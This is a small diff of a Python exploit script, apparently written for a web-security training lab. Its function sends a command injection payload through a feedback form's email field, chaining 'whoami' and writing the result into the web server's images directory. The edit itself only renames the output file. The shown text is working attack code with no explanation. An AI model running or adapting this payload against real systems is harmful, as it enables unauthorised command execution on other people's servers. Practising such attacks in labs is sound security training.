@@ -16,7 +16,7 @@ def get_csrf_token(s,url):
 
 def exploit_command_injection(s, url):
     submit_feedback_path = '/feedback/submit'
-    command_injection = 'test@test.ca & whoami > /var/www/images/output2.txt #'
+    command_injection = 'test@test.ca & whoami > /var/www/images/Out2.txt #'
     csrf_token = get_csrf_token(s, url)
     data = {'csrf': csrf_token, 'name': 'test', 'email': command_injection, 'subject': 'test', 'message': 'test'}
     res = s.post(url + submit_feedback_path, data=data, verify=False, proxies=proxies)
